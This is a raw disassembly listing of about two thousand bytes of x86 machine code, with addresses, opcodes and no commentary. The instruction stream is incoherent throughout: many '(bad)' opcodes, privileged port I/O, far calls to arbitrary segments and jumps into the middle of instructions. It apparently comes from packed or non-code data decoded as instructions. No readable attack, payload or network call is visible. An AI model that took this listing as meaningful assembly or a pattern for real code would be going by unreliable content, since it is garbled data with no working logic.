  41a6ea:	leave  
  41a6eb:	mov    ss,WORD PTR [ecx+0x51]
  41a6ee:	or     dl,BYTE PTR [ebx-0x479b8de0]
  41a6f4:	cmp    ah,BYTE PTR [eax+ebx*1-0x32f33eff]
  41a6fb:	xchg   ecx,eax
  41a6fc:	ja     0x41a6c3
  41a6fe:	inc    esi
  41a6ff:	scas   eax,DWORD PTR es:[edi]
  41a700:	mov    bh,0x39
  41a702:	bound  edi,QWORD PTR [edi+0x5e]
  41a705:	jno    0xfa279ace
  41a70b:	andnps xmm0,XMMWORD PTR [edx]
  41a70e:	mov    eax,0xf9344b72
  41a713:	lods   eax,DWORD PTR ds:[esi]
  41a714:	mov    bh,0xe8
  41a716:	popf   
  41a717:	and    al,0x18
  41a719:	add    BYTE PTR [ebp+0x70],0x2f
  41a71d:	xor    BYTE PTR [eax+0x5b],ah
  41a720:	mov    ecx,0x36519c9e
  41a725:	mov    ecx,DWORD PTR [edx]
  41a727:	mov    esi,0x347c7718
  41a72c:	pop    ebp
  41a72d:	call   0x590c86a5
  41a732:	cmc    
  41a733:	dec    ebp
  41a734:	jg     0x41a6e7
  41a736:	mov    ds,ebp
  41a738:	dec    ebp
  41a739:	call   0x2c2a787d
  41a73e:	cdq    
  41a73f:	call   0x4ae5:0x7533c2bf
  41a746:	xor    BYTE PTR [bp+di+0x36],al
  41a74a:	retf   0x1d6a
  41a74d:	in     al,dx
  41a74e:	(bad)  
  41a74f:	xchg   ebx,eax
  41a750:	sub    al,0xb3
  41a752:	retf   
  41a753:	fadd   DWORD PTR [edx]
  41a755:	iret   
  41a756:	stc    
  41a757:	and    al,0x27
  41a759:	mov    bh,0x82
  41a75b:	mov    eax,ds:0xcac0de53
  41a760:	cmp    DWORD PTR [esi+0x571cb53c],ebp
  41a766:	daa    
  41a767:	xor    al,0xcd
  41a769:	rol    DWORD PTR ds:0x52c706eb,cl
  41a76f:	dec    edi
  41a770:	or     eax,0xdcca6450
  41a775:	retf   
  41a776:	or     dh,ch
  41a778:	(bad)  
  41a779:	mov    edi,0xc9f3d01b
  41a77e:	nop
  41a77f:	icebp  
  41a780:	xor    ecx,DWORD PTR [ecx-0x58]
  41a783:	call   0xe3ad:0xe39ab82a
  41a78a:	leave  
  41a78b:	fs push ds
  41a78d:	(bad)  
  41a78e:	sbb    eax,0xd6826c80
  41a793:	or     BYTE PTR [eax],ch
  41a795:	(bad)  
  41a798:	jo     0x41a7b8
  41a79a:	repz cdq 
  41a79c:	jg     0x41a772
  41a79e:	mul    bh
  41a7a0:	mov    edx,0x40af0c29
  41a7a5:	fadd   st,st(0)
  41a7a7:	int3   
  41a7a8:	add    eax,0xe16e042
  41a7ad:	fmul   DWORD PTR [edi]
  41a7af:	nop
  41a7b0:	ret    
  41a7b1:	lahf   
  41a7b2:	mov    al,ds:0x364d2031
  41a7b7:	enter  0xc659,0x98
  41a7bb:	add    cl,BYTE PTR [ebp-0xa0b83e5]
  41a7c1:	in     al,dx
  41a7c2:	mov    esp,0x506a5744
  41a7c7:	xchg   BYTE PTR [eax+ecx*2],al
  41a7ca:	and    eax,0x94c94923
  41a7cf:	(bad)  
  41a7d0:	dec    esi
  41a7d1:	inc    esp
  41a7d2:	(bad)  
  41a7d4:	jle    0x41a7f9
  41a7d6:	jle    0x41a7bd
  41a7d8:	stc    
  41a7d9:	cwde   
  41a7da:	mov    ecx,0x18417cfa
  41a7df:	jns    0x41a761
  41a7e1:	adc    DWORD PTR [ecx+0x121808dd],ebp
  41a7e7:	or     al,0xf6
  41a7e9:	jmp    0x41a783
  41a7eb:	jo     0x41a85b
  41a7ed:	xchg   edx,eax
  41a7ee:	jl     0x41a79e
  41a7f0:	call   0x7b7db6d7
  41a7f5:	test   DWORD PTR [ecx-0x40],esp
  41a7f8:	mov    ah,0xcc
  41a7fa:	jae    0x41a81a
  41a7fc:	jne    0x41a829
  41a7fe:	cwde   
  41a7ff:	jne    0x41a7e2
  41a801:	fnstcw WORD PTR [eax+eiz*1+0x75]
  41a805:	iret   
  41a806:	jbe    0x41a887
  41a808:	inc    esi
  41a809:	pop    esi
  41a80a:	in     al,0x42
  41a80c:	xchg   ebx,eax
  41a80d:	retf   0xbb43
  41a810:	jle    0x26d0b42c
  41a816:	lods   eax,DWORD PTR ds:[esi]
  41a817:	(bad)  
  41a818:	aam    0x87
  41a81a:	aas    
  41a81b:	imul   eax,esp,0x9fc756b3
  41a821:	push   0x31
  41a823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a824:	mov    al,ds:0x311cae60
  41a829:	pop    ebx
  41a82a:	ds out dx,eax
  41a82c:	std    
  41a82d:	nop
  41a82e:	arpl   WORD PTR [edx-0xa82b6f7],bx
  41a834:	dec    esp
  41a835:	(bad)  
  41a836:	cli    
  41a837:	sub    ah,BYTE PTR [ebx-0x56]
  41a83a:	jecxz  0x41a840
  41a83c:	lea    ebp,[ebx-0xb26a72]
  41a842:	xlat   BYTE PTR ds:[ebx]
  41a843:	xlat   BYTE PTR ds:[ebx]
  41a844:	mov    ds:0xfcaa4900,eax
  41a849:	cmp    ch,BYTE PTR [edi+0x14]
  41a84c:	sti    
  41a84d:	popa   
  41a84e:	xor    eax,0x5a1b0c7e
  41a853:	xchg   ebp,eax
  41a854:	xchg   ecx,eax
  41a855:	icebp  
  41a856:	retf   0xbede
  41a859:	mov    ah,0xf9
  41a85b:	mov    bh,0xc5
  41a85d:	jmp    DWORD PTR [ebp+0x57fc1646]
  41a863:	outs   dx,DWORD PTR ds:[esi]
  41a864:	xchg   BYTE PTR [ebx],bh
  41a866:	test   ebp,esp
  41a868:	pop    esp
  41a869:	push   ecx
  41a86a:	(bad)  
  41a86b:	retf   
  41a86c:	inc    eax
  41a86d:	test   bl,dh
  41a86f:	pop    es
  41a870:	inc    ebx
  41a871:	cli    
  41a872:	push   esp
  41a873:	inc    BYTE PTR [ecx]
  41a875:	jae    0x41a830
  41a877:	xchg   ecx,eax
  41a878:	pop    eax
  41a879:	dec    ebp
  41a87a:	in     al,0x7a
  41a87c:	in     al,dx
  41a87d:	xchg   edi,eax
  41a87e:	enter  0xab00,0x34
  41a882:	mov    ebx,0xa1c76923
  41a887:	sar    DWORD PTR [eax-0x5232d98],1
  41a88d:	xchg   ebx,eax
  41a88e:	dec    ebp
  41a88f:	shr    DWORD PTR [edx],cl
  41a891:	sbb    al,0x2
  41a893:	sbb    al,0x24
  41a895:	xchg   edi,eax
  41a896:	fisubr DWORD PTR [edx+0x18]
  41a899:	scas   al,BYTE PTR es:[edi]
  41a89a:	fs mov bh,0xb
  41a89d:	push   0xeaf47710
  41a8a2:	pop    esi
  41a8a3:	push   ebx
  41a8a4:	push   es
  41a8a5:	stos   BYTE PTR es:[edi],al
  41a8a6:	inc    esp
  41a8a7:	push   ebx
  41a8a8:	outs   dx,DWORD PTR ds:[esi]
  41a8a9:	mov    eax,0x7d7750e7
  41a8ae:	cmp    al,0x11
  41a8b0:	test   DWORD PTR [ebx+0x33c36c65],0xe5661855
  41a8ba:	out    0x5,eax
  41a8bc:	hlt    
  41a8bd:	jg     0x41a933
  41a8bf:	ret    0xea46
  41a8c2:	je     0x41a8af
  41a8c4:	or     al,0x66
  41a8c6:	push   ebp
  41a8c7:	jmp    0xb4d5:0x921683f4
  41a8ce:	sar    BYTE PTR [ebx+0x2b],cl
  41a8d1:	pushf  
  41a8d2:	push   ecx
  41a8d3:	int3   
  41a8d4:	sub    cl,ah
  41a8d6:	add    bl,dh
  41a8d8:	and    DWORD PTR [edx-0x36bdb09c],eax
  41a8de:	mov    edx,0x377c30e1
  41a8e3:	pop    eax
  41a8e4:	fadd   QWORD PTR [edi-0x26]
  41a8e7:	adc    BYTE PTR [edi-0x2e78523b],bl
  41a8ed:	and    ch,bh
  41a8ef:	fst    st(3)
  41a8f1:	push   es
  41a8f2:	adc    eax,0xf899e5ee
  41a8f7:	add    ebp,DWORD PTR [eax-0x4c]
  41a8fa:	sub    ch,BYTE PTR [edx+eax*8-0x10]
  41a8fe:	pop    edx
  41a8ff:	stc    
  41a900:	mov    ch,0xfe
  41a902:	xor    al,0x9
  41a904:	sub    DWORD PTR [eax],0x5ea49097
  41a90a:	jne    0x41a98b
  41a90c:	lock test eax,0x20c179b8
  41a912:	(bad)  
  41a913:	cmp    eax,0xea7de4a7
  41a918:	(bad)  
  41a919:	push   ss
  41a91a:	retf   
  41a91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a91c:	sbb    BYTE PTR [ecx-0x3b6d6ea5],cl
  41a922:	mov    bl,0xae
  41a924:	dec    edx
  41a925:	icebp  
  41a926:	and    BYTE PTR [esp+ebp*1+0x50447594],0xf4
  41a92e:	enter  0xb835,0x91
  41a932:	shr    DWORD PTR [edx-0x1b],1
  41a935:	or     cl,dl
  41a937:	adc    DWORD PTR [edi-0x4],ebp
  41a93a:	mov    WORD PTR [edx],?
  41a93c:	adc    DWORD PTR [ecx],eax
  41a93e:	pop    ds
  41a93f:	mov    edx,0xf2c37b7b
  41a944:	fdivr  QWORD PTR [eax]
  41a946:	ins    DWORD PTR es:[edi],dx
  41a947:	and    al,0xbc
  41a949:	or     DWORD PTR [eax],0xffffff91
  41a94c:	hlt    
  41a94d:	xchg   esp,eax
  41a94e:	jns    0x41a956
  41a950:	add    eax,0x493f61c5
  41a955:	push   0xf2eeaf0f
  41a95a:	pop    ds
  41a95b:	inc    ebx
  41a95c:	rcr    BYTE PTR [esp+edi*2],0x38
  41a960:	js     0x41a90d
  41a962:	retf   
  41a963:	pop    esp
  41a964:	xchg   edx,eax
  41a965:	mov    ah,0x26
  41a967:	outs   dx,BYTE PTR ds:[esi]
  41a968:	push   ebp
  41a969:	or     al,bh
  41a96b:	xchg   edi,eax
  41a96c:	aad    0x9c
  41a96e:	scas   eax,DWORD PTR es:[edi]
  41a96f:	push   ebx
  41a970:	mov    DWORD PTR [eax+esi*4],edx
  41a973:	jecxz  0x41a982
  41a975:	xchg   esp,eax
  41a976:	xlat   BYTE PTR ds:[ebx]
  41a977:	scas   eax,DWORD PTR es:[edi]
  41a978:	mov    ds:0x558bd5c2,eax
  41a97d:	out    dx,eax
  41a97e:	scas   al,BYTE PTR es:[edi]
  41a97f:	das    
  41a980:	stc    
  41a981:	mov    dh,BYTE PTR [ecx-0x7734aa21]
  41a987:	cdq    
  41a988:	and    BYTE PTR [edx+0x1da6f954],dl
  41a98e:	pop    ss
  41a98f:	jne    0x41aa0f
  41a991:	push   ebp
  41a992:	retf   0x17de
  41a995:	xchg   ebp,eax
  41a996:	and    esp,ebx
  41a998:	das    
  41a999:	idiv   DWORD PTR [eax+0x47]
  41a99c:	(bad)  
  41a99d:	adc    dl,BYTE PTR [edi]
  41a99f:	repnz pop edi
  41a9a1:	scas   al,BYTE PTR es:[edi]
  41a9a2:	(bad)  
  41a9a3:	and    bl,BYTE PTR [eax-0x18]
  41a9a6:	mov    ecx,0x49599c4d
  41a9ab:	push   eax
  41a9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ad:	es push es
  41a9af:	ja     0x41aa2f
  41a9b1:	into   
  41a9b2:	cmp    DWORD PTR [edi-0x58],edx
  41a9b5:	mov    dl,0x3b
  41a9b7:	sbb    DWORD PTR [ebp+0x1afe55b9],edi
  41a9bd:	sbb    edi,0xffffff9f
  41a9c0:	pop    edx
  41a9c1:	jb     0x41a9a6
  41a9c3:	cmp    al,BYTE PTR [ecx-0x6fa3f101]
  41a9c9:	mov    al,fs:0xa4d33e73
  41a9cf:	inc    esp
  41a9d0:	call   0x1df5:0xcd4e3b78
  41a9d7:	fucomp st(2)
  41a9d9:	(bad)  
  41a9da:	adc    DWORD PTR [ebp-0x535b53ab],esp
  41a9e0:	ror    eax,cl
  41a9e2:	sbb    edx,ebp
  41a9e4:	and    eax,0x992fb3b0
  41a9e9:	mov    DWORD PTR [ebx-0x5c29bcc4],ecx
  41a9ef:	mov    bl,ah
  41a9f1:	inc    esi
  41a9f2:	adc    eax,0xade9e238
  41a9f7:	cli    
  41a9f8:	jl     0x41aa79
  41a9fa:	shl    BYTE PTR [edx],1
  41a9fc:	xchg   ecx,eax
  41a9fd:	xlat   BYTE PTR ds:[ebx]
  41a9fe:	adc    esi,ebp
  41aa00:	dec    ecx
  41aa01:	push   edi
  41aa02:	pop    esi
  41aa03:	xchg   edi,eax
  41aa04:	mov    edi,0x45e2c65b
  41aa09:	sub    eax,0xe055ef48
  41aa0e:	push   ss
  41aa0f:	xchg   esp,eax
  41aa10:	cwde   
  41aa11:	inc    ebx
  41aa12:	jmp    0x41aa02
  41aa14:	sub    eax,DWORD PTR [edi+eiz*8-0x9]
  41aa18:	call   0xb1cb:0x7b6aaf7
  41aa1f:	fld    DWORD PTR [ebp+0x22108471]
  41aa25:	call   0x8f02de82
  41aa2a:	stc    
  41aa2b:	or     al,0x24
  41aa2d:	dec    ecx
  41aa2e:	push   ecx
  41aa2f:	repz dec edx
  41aa31:	jl     0x41a9bf
  41aa33:	je     0x41aa2f
  41aa35:	sbb    eax,0x2599edb0
  41aa3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa3c:	in     eax,dx
  41aa3d:	mov    ds:0xd0b93dd1,eax
  41aa42:	dec    esi
  41aa43:	xor    DWORD PTR [edx-0x6fc3caa3],esi
  41aa49:	jae    0x41aa0a
  41aa4b:	loopne 0x41aa0a
  41aa4d:	sbb    DWORD PTR [edi+ecx*2+0x14f87bb],0x2c0f3962
  41aa58:	mov    BYTE PTR [edx-0x56],0xbb
  41aa5c:	pusha  
  41aa5d:	or     ebx,ecx
  41aa5f:	xor    bl,BYTE PTR gs:[edx-0x6a]
  41aa63:	xor    DWORD PTR [eax-0x56c0a41a],esi
  41aa69:	aad    0x8c
  41aa6b:	cmp    eax,0x9fad58e1
  41aa70:	adc    eax,DWORD PTR [esi]
  41aa72:	retf   0x56f5
  41aa75:	lea    edi,[ecx]
  41aa77:	or     DWORD PTR [eax],edx
  41aa79:	add    DWORD PTR [edi-0x3e],0x1b
  41aa7d:	loop   0x41aaab
  41aa7f:	pop    edx
  41aa80:	mov    al,ds:0x2bfdd56e
  41aa85:	leave  
  41aa86:	push   ds
  41aa87:	xor    al,0x23
  41aa89:	stc    
  41aa8a:	mov    al,ds:0x615cb44
  41aa8f:	cld    
  41aa90:	sti    
  41aa91:	jge    0x41aa6b
  41aa93:	daa    
  41aa94:	ss fs dec eax
  41aa97:	adc    edi,DWORD PTR [edx+0xbe453dc]
  41aa9d:	sub    ecx,DWORD PTR [esi-0x5e673c60]
  41aaa3:	jg     0x41ab1c
  41aaa5:	mov    ah,0xd8
  41aaa7:	jecxz  0x41aafa
  41aaa9:	dec    ecx
  41aaaa:	xor    al,0x8d
  41aaac:	call   0xf971:0x91623172
  41aab3:	scas   al,BYTE PTR es:[edi]
  41aab4:	or     al,0xa3
  41aab6:	retf   
  41aab7:	retf   
  41aab8:	sbb    eax,0xefa18656
  41aabd:	push   ebx
  41aabe:	mov    ?,WORD PTR [ebp-0x14]
  41aac1:	pushf  
  41aac2:	ins    BYTE PTR es:[edi],dx
  41aac3:	lahf   
  41aac4:	jne    0x41aa49
  41aac6:	cs adc al,0xed
  41aac9:	sub    DWORD PTR [eax+esi*1-0x36],edi
  41aacd:	cmp    DWORD PTR [edx-0x29],edx
  41aad0:	sbb    al,0x7e
  41aad2:	cmp    eax,0xfd71252b
  41aad7:	fbstp  TBYTE PTR [ecx-0x8]
  41aada:	jle    0x41ab1a
  41aadc:	and    BYTE PTR [esi+0x12c02dc1],ch
  41aae2:	int    0x41
  41aae4:	hlt    
  41aae5:	test   al,0x91
  41aae7:	sub    ebx,DWORD PTR [ebp+0x5b06f3df]
  41aaed:	shl    DWORD PTR [edx+0x5487a9d4],1
  41aaf3:	adc    edi,DWORD PTR [eax]
  41aaf5:	mov    bh,0x4d
  41aaf7:	cmp    eax,0x85ec831f
  41aafc:	test   eax,esi
  41aafe:	pop    ecx
  41aaff:	ret    0xa13e
  41ab02:	stos   DWORD PTR es:[edi],eax
  41ab03:	add    eax,0x13
  41ab06:	mov    ecx,0x6ef15d4d
  41ab0b:	in     eax,dx
  41ab0c:	not    ecx
  41ab0e:	cmp    BYTE PTR [eax-0x6092e2f],0x39
  41ab15:	mov    al,0xc5
  41ab17:	xchg   BYTE PTR [ebx-0x46],cl
  41ab1a:	jo     0x41ab48
  41ab1c:	loope  0x41ab5d
  41ab1e:	mov    eax,ds:0x3ece3d3f
  41ab23:	dec    ecx
  41ab24:	mov    ah,0x57
  41ab27:	retf   
  41ab28:	comiss xmm7,DWORD PTR [ebx+0x3a]
  41ab2c:	cli    
  41ab2d:	inc    esi
  41ab2e:	push   edx
  41ab2f:	test   eax,0x6b9edcc0
  41ab34:	push   eax
  41ab35:	mov    esp,0xeff2e603
  41ab3a:	ins    DWORD PTR es:[edi],dx
  41ab3b:	push   es
  41ab3c:	sbb    dl,0xaf
  41ab3f:	cmp    al,0x94
  41ab41:	mov    bh,0x43
  41ab43:	adc    ch,BYTE PTR [edi-0x35]
  41ab46:	pusha  
  41ab47:	stos   BYTE PTR es:[edi],al
  41ab48:	ret    
  41ab49:	shl    esp,0xee
  41ab4c:	ss inc ecx
  41ab4e:	sub    BYTE PTR [ecx-0x42e6ffb6],dh
  41ab54:	pop    ds
  41ab55:	or     bh,bl
  41ab57:	add    al,0x0
  41ab59:	xchg   ebp,eax
  41ab5a:	sbb    al,0x4f
  41ab5c:	sub    esp,edi
  41ab5e:	shl    ebp,cl
  41ab60:	sbb    esi,edi
  41ab62:	mov    edi,0x5a1b95c9
  41ab67:	and    al,0x4b
  41ab69:	pop    eax
  41ab6a:	jnp    0x41ab56
  41ab6c:	xor    ecx,DWORD PTR [ebp+0x2045d60]
  41ab72:	mov    dl,0x9a
  41ab74:	fimul  DWORD PTR [edx+0x1c]
  41ab77:	daa    
  41ab78:	pop    ss
  41ab79:	fmul   QWORD PTR [esi]
  41ab7b:	and    ch,cl
  41ab7d:	es (bad) 
  41ab7f:	add    al,0xf
  41ab81:	pop    esp
  41ab82:	in     al,dx
  41ab83:	dec    esi
  41ab84:	retf   0x42ff
  41ab87:	cmp    ah,BYTE PTR [ebp-0x550b120]
  41ab8d:	mov    DWORD PTR [edi-0x3b20f460],edi
  41ab93:	fistp  DWORD PTR [esp+edx*8+0x4e639e2e]
  41ab9a:	sahf   
  41ab9b:	lock pop ss
  41ab9d:	push   ss
  41ab9e:	mov    dl,0xc6
  41aba0:	mov    dl,al
  41aba2:	sub    BYTE PTR [eax-0x3e],ah
  41aba5:	imul   esi,ebp,0xffffff92
  41aba8:	sub    ch,BYTE PTR fs:[eax]
  41abab:	jp     0x41ab50
  41abad:	xchg   ebx,eax
  41abae:	lahf   
  41abaf:	rcr    BYTE PTR [edi-0x2a],cl
  41abb2:	sub    DWORD PTR [ebp+0x563cd3a9],ebx
  41abb8:	mov    bl,0x91
  41abba:	shl    cl,1
  41abbc:	lods   al,BYTE PTR ds:[esi]
  41abbd:	bound  esp,QWORD PTR [edi-0xaaa2d8f]
  41abc3:	les    edi,FWORD PTR [edi+0x5b]
  41abc6:	daa    
  41abc7:	sbb    al,0xcd
  41abc9:	adc    eax,DWORD PTR [ebp-0x4c2ca4c7]
  41abcf:	and    al,0x8b
  41abd1:	(bad)  
  41abd2:	fld    st(5)
  41abd4:	and    BYTE PTR [ecx-0x45],al
  41abd7:	sti    
  41abd8:	xchg   esp,eax
  41abd9:	stos   DWORD PTR es:[edi],eax
  41abda:	xor    cl,bl
  41abdc:	jo     0x41ac29
  41abde:	xchg   esi,eax
  41abdf:	adc    al,0x5
  41abe1:	and    BYTE PTR [edi],bl
  41abe3:	mov    esi,0x6179c913
  41abe8:	in     eax,dx
  41abe9:	add    eax,DWORD PTR cs:[esi+0x32cda005]
  41abf0:	pop    ebx
  41abf1:	mov    eax,ds:0x554e00f4
  41abf6:	jmp    0x8a61:0x6e25f163
  41abfd:	jg     0x41abe2
  41abff:	iret   
  41ac00:	icebp  
  41ac01:	xor    eax,edx
  41ac03:	stos   BYTE PTR es:[edi],al
  41ac04:	loope  0x41ac16
  41ac06:	cvttps2pi mm2,QWORD PTR [edx-0x36b515b9]
  41ac0d:	add    DWORD PTR [ecx],0x4
  41ac10:	and    al,0x8e
  41ac12:	mov    cl,0x49
  41ac14:	sbb    al,0xb7
  41ac16:	mov    ds,WORD PTR [ebp-0x565ccb37]
  41ac1c:	sbb    eax,0xe231e8
  41ac21:	sub    dh,al
  41ac23:	pop    ss
  41ac24:	push   eax
  41ac25:	or     al,0x5d
  41ac27:	into   
  41ac28:	add    edx,DWORD PTR [edx-0x60c4e24c]
  41ac2e:	mov    edx,0x299777dd
  41ac33:	out    dx,eax
  41ac34:	inc    ecx
  41ac35:	or     al,0x20
  41ac37:	sub    cl,BYTE PTR [esp+edi*8-0x7714179a]
  41ac3e:	sahf   
  41ac3f:	pop    esp
  41ac40:	sbb    BYTE PTR [ebx+0x2f],dl
  41ac43:	sbb    eax,0x9abfc078
  41ac48:	push   esp
  41ac49:	push   ebx
  41ac4a:	out    dx,eax
  41ac4b:	fsubr  st(2),st
  41ac4d:	outs   dx,BYTE PTR ds:[esi]
  41ac4e:	fisubr DWORD PTR [ebx+0x4e93a842]
  41ac54:	and    al,0xb3
  41ac56:	aam    0x35
  41ac58:	jne    0x41abf1
  41ac5a:	dec    ecx
  41ac5b:	lock jecxz 0x41abe3
  41ac5e:	(bad)  
  41ac5f:	idiv   BYTE PTR [ebx+0x43804aa4]
  41ac65:	cmc    
  41ac66:	push   cs
  41ac67:	cwde   
  41ac68:	(bad)  
  41ac69:	mov    edi,0xd0807c22
  41ac6e:	xor    ah,BYTE PTR [ebx]
  41ac70:	push   ss
  41ac71:	jecxz  0x41ac81
  41ac73:	cld    
  41ac74:	jns    0x41ac13
  41ac76:	lock xor edx,DWORD PTR [ecx-0x1d]
  41ac7a:	mov    ah,al
  41ac7c:	sbb    DWORD PTR [eax+edi*4],ecx
  41ac7f:	aad    0xcd
  41ac81:	fisttp QWORD PTR [ecx]
  41ac83:	pop    esi
  41ac84:	inc    ebx
  41ac85:	cmp    bl,dh
  41ac87:	xchg   DWORD PTR [esi],ecx
  41ac89:	or     al,0x7f
  41ac8b:	or     al,0x9c
  41ac8d:	xor    DWORD PTR [esi-0x72],0x53
  41ac91:	lahf   
  41ac92:	xchg   ebp,eax
  41ac93:	jns    0x41acdd
  41ac95:	popa   
  41ac96:	dec    esi
  41ac97:	mov    bl,0xb0
  41ac99:	int    0xca
  41ac9b:	retf   
  41ac9c:	dec    ecx
  41ac9d:	mov    ds:0xd0895ab6,al
  41aca2:	add    eax,ebp
  41aca4:	arpl   bx,dx
  41aca6:	repz cld 
  41aca8:	sti    
  41aca9:	add    bl,0x2a
  41acac:	xor    dl,0xfe
  41acaf:	pushf  
  41acb0:	sub    DWORD PTR [esi+ecx*1],ebp
  41acb3:	scas   al,BYTE PTR es:[edi]
  41acb4:	xor    al,0x36
  41acb6:	push   edi
  41acb7:	loop   0x41ac78
  41acb9:	pushf  
  41acba:	push   ss
  41acbb:	mov    bh,0x77
  41acbd:	in     al,dx
  41acbe:	sbb    eax,0x423af853
  41acc3:	xlat   BYTE PTR ds:[bx]
  41acc5:	sub    DWORD PTR [esi+0x2f2d2214],ebp
  41accb:	jne    0x41acd8
  41accd:	push   ds
  41acce:	pop    eax
  41accf:	jg     0x41acc7
  41acd1:	jmp    0x37f0b604
  41acd6:	mov    edx,0xbfaaf426
  41acdb:	xchg   edx,eax
  41acdc:	nop
  41acdd:	test   eax,0x5ae76081
  41ace2:	pop    esi
  41ace3:	mov    bl,0x8c
  41ace5:	daa    
  41ace6:	dec    ebp
  41ace7:	ret    
  41ace8:	and    al,0x29
  41acea:	add    DWORD PTR [edi-0x3c2876e5],esp
  41acf0:	mov    ebx,DWORD PTR [ecx]
  41acf2:	jbe    0x41ad48
  41acf4:	retf   0x7a0
  41acf7:	jecxz  0x41ad05
  41acf9:	fstp   TBYTE PTR [edx-0x29]
  41acfc:	std    
  41acfd:	mov    ah,0x4d
  41acff:	leave  
  41ad00:	push   edx
  41ad01:	push   ss
  41ad02:	in     eax,0xdd
  41ad04:	mov    ds:0xbb272e72,al
  41ad09:	pop    ecx
  41ad0a:	push   ebp
  41ad0b:	push   0xffffff9d
  41ad0d:	jmp    0x41acd3
  41ad0f:	mov    esp,0x687b6e6
  41ad14:	mov    eax,0xdc4d5aae
  41ad19:	pop    edi
  41ad1a:	push   cs
  41ad1b:	or     dl,BYTE PTR [edi]
  41ad1d:	jbe    0x41ad0d
  41ad1f:	jg     0x41acf4
  41ad21:	mov    al,0x19
  41ad23:	(bad)  
  41ad24:	or     ecx,DWORD PTR [eax+0x52df832a]
  41ad2a:	out    dx,al
  41ad2b:	mov    ebx,0xbe945a10
  41ad30:	aam    0xb6
  41ad32:	rcr    bh,cl
  41ad34:	cmp    cl,BYTE PTR [ebx-0x79baaa01]
  41ad3a:	mov    edx,DWORD PTR [ebp-0x31]
  41ad3d:	mov    ?,WORD PTR [edx]
  41ad3f:	mov    esp,0xc827a49b
  41ad44:	jne    0x41ad31
  41ad46:	nop
  41ad47:	in     eax,0x32
  41ad49:	retf   
  41ad4a:	retf   
  41ad4b:	dec    esi
  41ad4c:	mov    bl,0x5f
  41ad4e:	or     dl,BYTE PTR [ebx-0x62c22f85]
  41ad54:	stos   BYTE PTR es:[edi],al
  41ad55:	xlat   BYTE PTR ds:[ebx]
  41ad56:	stos   BYTE PTR es:[edi],al
  41ad57:	mov    cl,BYTE PTR [edi+0x78b6e06d]
  41ad5d:	xchg   esi,eax
  41ad5e:	ja     0x41ace7
  41ad60:	inc    DWORD PTR ds:0x8d37c4e1
  41ad66:	xlat   BYTE PTR ds:[ebx]
  41ad67:	mov    ds:0x70ab5952,eax
  41ad6c:	pusha  
  41ad6d:	xor    BYTE PTR [esi],0x7e
  41ad70:	sub    cl,BYTE PTR [ecx-0x61c1cd78]
  41ad76:	mov    eax,0xaf2a31fb
  41ad7b:	dec    edi
  41ad7c:	clc    
  41ad7d:	jo     0x41ad75
  41ad7f:	lds    esi,FWORD PTR [ebp-0x78]
  41ad82:	test   eax,0x191b575c
  41ad87:	push   ecx
  41ad88:	popa   
  41ad89:	xor    DWORD PTR [ecx-0x60a3c127],esp
  41ad8f:	push   ds
  41ad90:	mov    esp,0x126a3b3d
  41ad95:	push   ecx
  41ad96:	hlt    
  41ad97:	or     bl,0xbe
  41ad9a:	pop    esp
  41ad9b:	sub    ch,BYTE PTR [ebx]
  41ad9d:	pop    ecx
  41ad9e:	mov    ch,0x98
  41ada0:	(bad)  
  41ada1:	aad    0xe8
  41ada3:	ret    0x878
  41ada6:	jnp    0x41ae08
  41ada8:	jmp    0x41ad44
  41adaa:	jle    0x41aded
  41adac:	jno    0x41adef
  41adae:	retf   
  41adaf:	test   eax,0x1826a9f
  41adb4:	sub    BYTE PTR [ebx+ecx*2-0x3a3107dc],dh
  41adbb:	std    
  41adbc:	xchg   BYTE PTR [esp+edi*1+0x2d1aa124],ch
  41adc3:	fcom   QWORD PTR [ebx+0x33]
  41adc6:	xchg   BYTE PTR [ebx+ebp*4],bl
  41adc9:	ret    
  41adca:	jbe    0x41ad9d
  41adcc:	sub    DWORD PTR [edi],edx
  41adce:	sub    eax,0xbca4ac47
  41add3:	repz sub al,0xc6
  41add6:	cmp    eax,0xa3fda024
  41addb:	jle    0x41adb2
  41addd:	inc    BYTE PTR [ebp-0x17]
  41ade0:	lods   eax,DWORD PTR ds:[esi]
  41ade1:	fldlg2 
  41ade3:	xchg   esi,eax
  41ade4:	and    ebx,DWORD PTR [eax+ebx*8-0x7972e735]
  41adeb:	fs mov dh,0xf1
  41adee:	dec    esi
  41adef:	not    BYTE PTR [edi-0x11]
  41adf2:	mov    ecx,DWORD PTR [edi-0x6f]
  41adf5:	xchg   ecx,eax
  41adf6:	dec    ebx
  41adf7:	popf   
  41adf8:	test   al,0x94
  41adfa:	sbb    esp,edx
  41adfc:	inc    esp
  41adfd:	cmp    eax,DWORD PTR [ecx-0x72dc23fe]
  41ae03:	sahf   
  41ae04:	es cwde 
  41ae06:	in     al,dx
  41ae07:	cmp    DWORD PTR [ebx-0x2b],esp
  41ae0a:	jb     0x41ae03
  41ae0c:	retf   0x2004
  41ae0f:	dec    ebp
  41ae10:	sbb    cl,BYTE PTR [esi+0x741947fa]
  41ae16:	test   eax,0x1ab1852
  41ae1b:	sbb    eax,0xd11ffe25
  41ae20:	cmc    
  41ae21:	or     al,0x11
  41ae23:	dec    ecx
  41ae24:	cmp    BYTE PTR [edx*8-0x4e4ad8d],0x89
  41ae2c:	les    edx,FWORD PTR [eax+0x589b738f]
  41ae32:	mov    edx,DWORD PTR [eax-0x55ad41b2]
  41ae38:	mov    ebp,0xd89fe76
  41ae3d:	xchg   DWORD PTR [ecx],esi
  41ae3f:	jbe    0x41adcf
  41ae41:	jmp    0x96a8:0x8ae377e6
  41ae48:	mov    al,0x5c
  41ae4a:	mov    eax,ds:0x32873039
  41ae4f:	repz mov eax,0x82d5f3ef
  41ae55:	push   esi
  41ae56:	lods   eax,DWORD PTR ds:[esi]
  41ae57:	dec    ebx
  41ae58:	retf   
  41ae59:	lods   al,BYTE PTR ds:[esi]
  41ae5a:	xor    esi,ebp
  41ae5c:	enter  0x2ba9,0xae
  41ae60:	std    
  41ae61:	sbb    eax,edx
  41ae63:	(bad)  
  41ae64:	push   ecx
  41ae65:	arpl   WORD PTR [edi],bx
  41ae67:	push   cs
  41ae68:	mov    eax,ds:0xc884a3d5
  41ae6d:	and    al,0x17
  41ae6f:	outs   dx,DWORD PTR ds:[esi]
  41ae70:	call   0x9bf8:0xef046fc6
